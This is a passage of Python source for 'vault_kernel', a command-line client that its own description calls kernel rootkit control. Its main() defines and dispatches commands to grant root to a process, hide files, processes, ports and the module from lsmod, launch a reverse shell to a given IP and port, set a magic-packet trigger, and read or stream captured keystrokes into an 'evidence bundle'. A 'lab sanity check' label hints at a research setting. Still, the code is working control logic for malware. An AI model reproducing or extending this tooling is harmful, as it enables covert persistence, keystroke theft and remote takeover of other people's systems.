                time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                os.path.isdir(SYSFS_MODULE))
            payload = json.dumps(bundle, indent=2)
            if out:
                fd = os.open(out, os.O_WRONLY | os.O_CREAT | os.O_TRUNC,
                             0o600)
                with os.fdopen(fd, "w", encoding="utf-8") as fh:
                    fh.write(payload + "\n")
                print(f"[+] Evidence bundle written to {out} "
                      f"({len(payload) + 1} bytes)")
            else:
                print(payload)
        finally:
            self._close()


def main():
    parser = argparse.ArgumentParser(
        description="vault_kernel CLI — kernel rootkit control",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    subparsers = parser.add_subparsers(dest="command", help="Available commands")

    sp = subparsers.add_parser("status", help="Check if rootkit is loaded")
    sp.add_argument("--json", action="store_true", dest="as_json",
                    help="emit module presence as machine-readable JSON")
    sp = subparsers.add_parser("doctor", help="Diagnose module/client state (lab sanity check)")
    sp.add_argument("--json", action="store_true", dest="as_json",
                    help="emit diagnostics as machine-readable JSON")

    sp = subparsers.add_parser("give-root", help="Escalate process to root")
    sp.add_argument("pid", nargs="?", type=int, default=0,
                    help="Target PID (default: self)")

    sp = subparsers.add_parser("hide-file", help="Hide a file/directory")
    sp.add_argument("name", help="File or directory name")

    sp = subparsers.add_parser("unhide-file", help="Reveal a hidden file/directory")
    sp.add_argument("name", help="File or directory name")

    sp = subparsers.add_parser("hide-pid", help="Hide a process")
    sp.add_argument("pid", type=_pid_arg, help="Process ID (>= 1)")

    sp = subparsers.add_parser("unhide-pid", help="Reveal a hidden process")
    sp.add_argument("pid", type=_pid_arg, help="Process ID (>= 1)")

    sp = subparsers.add_parser("hide-port", help="Hide a TCP/UDP port")
    sp.add_argument("port", type=_port_arg, help="Port number (1-65535)")

    sp = subparsers.add_parser("unhide-port", help="Reveal a hidden port")
    sp.add_argument("port", type=_port_arg, help="Port number (1-65535)")

    sp = subparsers.add_parser("list", help="List all hidden items")
    sp.add_argument("--json", action="store_true", dest="as_json",
                    help="emit the hidden list as machine-readable JSON")
    sp = subparsers.add_parser("stats", help="Show module stats")
    sp.add_argument("--json", action="store_true", dest="as_json",
                    help="emit stats as machine-readable JSON")

    sp = subparsers.add_parser(
        "watch", help="Live view of stats + hidden list (Ctrl-C to stop)")
    sp.add_argument("--interval", type=_ms_arg,
                    default=WATCH_DEFAULT_INTERVAL_MS, metavar="MS",
                    help="refresh interval in ms (default 1000, min 50)")
    sp.add_argument("--once", action="store_true",
                    help="render a single frame and exit (no ANSI control)")

    sp = subparsers.add_parser("shell", help="Trigger reverse shell")
    sp.add_argument("target", type=_shell_target_arg,
                    help="IP:PORT for reverse shell")

    sp = subparsers.add_parser("magic", help="Set magic packet trigger word")
    sp.add_argument("word", help="Trigger word")

    sp = subparsers.add_parser("magic-encode", help="Print the kill() trigger for word+port")
    sp.add_argument("word", help="Trigger word")
    sp.add_argument("port", type=_port_arg, help="Callback port (1-65535)")

    sp = subparsers.add_parser("keylog", help="Read captured keystrokes")
    sp.add_argument("--follow", action="store_true",
                    help="stream new keystrokes until Ctrl-C")
    sp.add_argument("--timestamps", action="store_true",
                    help="prefix each follow event with [HH:MM:SS] "
                         "(requires --follow)")
    sp.add_argument("--interval", type=_ms_arg,
                    default=KEYLOG_DEFAULT_INTERVAL_MS, metavar="MS",
                    help="poll interval in ms for --follow (default 500, min 50)")
    sp.add_argument("--output", default=None, metavar="FILE",
                    help="also append every event to FILE (created 0600, "
                         "flushed per event)")
    sp = subparsers.add_parser(
        "capture", help="Evidence bundle: stats + hidden + keylog as JSON")
    sp.add_argument("--out", default=None, metavar="FILE",
                    help="write the bundle to FILE (created 0600) "
                         "instead of stdout")
    subparsers.add_parser("keylog-clear", help="Clear keylogger buffer")
    subparsers.add_parser("version", help="Print client version and ioctl ABI")
    subparsers.add_parser("hide-module", help="Hide from lsmod")
    subparsers.add_parser("unhide-module", help="Reveal in lsmod")
    subparsers.add_parser("reset", help="Clear ALL hidden files, PIDs and ports")

    parser.add_argument("-v", "--version", action="version",
                        version=format_version_line(),
                        help="print the client version line and exit")

    args = parser.parse_args()

    if args.command is None:
        parser.print_help()
        sys.exit(1)

    if os.geteuid() != 0:
        print("[!] Warning: not running as root. Some commands may fail.")

    if args.command == "keylog" and args.timestamps and not args.follow:
        parser.error("--timestamps requires --follow")

    client = VaultKernelClient()

    try:
        if args.command == "status":
            client.status(as_json=args.as_json)
        elif args.command == "doctor":
            run_doctor(as_json=args.as_json)
        elif args.command == "give-root":
            client.give_root(args.pid)
        elif args.command == "hide-file":
            client.hide_file(args.name)
        elif args.command == "unhide-file":
            client.unhide_file(args.name)
        elif args.command == "hide-pid":
            client.hide_pid(args.pid)
        elif args.command == "unhide-pid":
            client.unhide_pid(args.pid)
        elif args.command == "hide-port":
            client.hide_port(args.port)
        elif args.command == "unhide-port":
            client.unhide_port(args.port)
        elif args.command == "list":
            client.list_hidden(as_json=args.as_json)
        elif args.command == "stats":
            client.stats(as_json=args.as_json)
        elif args.command == "watch":
            # --interval is documented in ms (like the Go client);
            # _interval_ms_to_seconds clamps to the 50 ms floor.
            client.watch(interval_ms=args.interval, once=args.once)
        elif args.command == "shell":
            client.shell(args.target)
        elif args.command == "magic":
            client.set_magic(args.word)
        elif args.command == "magic-encode":
            client.magic_encode(args.word, args.port)
        elif args.command == "keylog":
            # --interval is documented in ms (like the Go client);
            # _interval_ms_to_seconds clamps to the 50 ms floor.
            interval = _interval_ms_to_seconds(args.interval)
            client.keylog_read(follow=args.follow, interval=interval,
                               timestamps=args.timestamps,
                               output=args.output)
        elif args.command == "capture":
            client.capture(out=args.out)
        elif args.command == "keylog-clear":
            client.keylog_clear()
        elif args.command == "hide-module":
            client.hide_module()
        elif args.command == "unhide-module":
            client.unhide_module()
        elif args.command == "reset":
            client.reset()
        elif args.command == "version":
            print(format_version_line())
    except Exception as e:
        print(f"[-] Error: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
